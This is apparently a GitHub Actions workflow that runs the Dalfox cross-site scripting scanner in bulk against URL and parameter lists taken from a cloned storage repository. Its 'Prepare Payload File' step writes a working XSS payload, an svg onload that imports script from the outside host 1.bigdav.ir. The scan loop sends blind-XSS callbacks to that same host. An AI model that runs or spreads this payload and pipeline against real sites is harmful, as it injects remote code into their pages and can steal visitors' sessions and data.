name: "3 - Dalfox XSS Scanner"

on:
  repository_dispatch:
    types:
      - dalfox-trigger

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout main branch
        uses: actions/checkout@v3

      - name: Setup Go
        uses: actions/setup-go@v3
        with:
          go-version: '1.18'

      - name: Install Dalfox
        run: go install github.com/hahwul/dalfox/v2@latest

      - name: Prepare Payload File
        run: |
          cat << 'EOF' > dalfox_payload.txt
          '";</script></title>test</textarea>"/>
          <svg/onload=import('https://1.bigdav.ir/');//
          EOF

      - name: Setup SSH
        uses: webfactory/ssh-agent@v0.5.4
        with:
          ssh-private-key: ${{ secrets.DEPLOY_KEY }}

      - name: Add github.com to known_hosts
        run: ssh-keyscan github.com >> ~/.ssh/known_hosts

      - name: Clone Storage Repo
        run: git clone ${{ github.event.client_payload.storage_repo }} storage_repo_clone

      - name: Run Dalfox Scan
        run: |
          set -e
          TARGET_NAME=${{ github.event.client_payload.target_name }}
          URL_FILE="storage_repo_clone/$TARGET_NAME/live-urls.txt"
          PARAMS_FILE="storage_repo_clone/$TARGET_NAME/params.txt"
          OUTPUT="dalfox-output.txt"

          # sanity checks
          [ -f "$URL_FILE" ] || { echo "URLs not found: $URL_FILE"; exit 1; }
          [ -f "$PARAMS_FILE" ] || { echo "Params not found: $PARAMS_FILE"; exit 1; }

          echo "Starting Dalfox scans..." > "$OUTPUT"

          # for each URL
          while IFS= read -r url || [[ -n "$url" ]]; do
            # create a slug from URL (strip protocol, replace /,?,=,& with -)
            url_slug=$(echo "$url" | sed -E 's#https?://##; s#[/:?=&]#-#g')
            # for each parameter
            while IFS= read -r param || [[ -n "$param" ]]; do
              [ -z "$param" ] && continue
              blind_url="https://1.bigdav.ir/${param}-${url_slug}"
              echo "Scanning $url with param $param (blind: $blind_url)" >> "$OUTPUT"
              $HOME/go/bin/dalfox url "$url" \
                --parameter "$param" \
                --custom-payload-file dalfox_payload.txt \
                -b "$blind_url" \
                >> "$OUTPUT" 2>&1
              echo "--------------------------------------------------" >> "$OUTPUT"
            done < "$PARAMS_FILE"
          done < "$URL_FILE"

          echo "Dalfox scan complete. Output at $OUTPUT"

      - name: Upload Dalfox Output
        uses: actions/upload-artifact@v3
        with:
          name: dalfox-output
          path: dalfox-output.txt
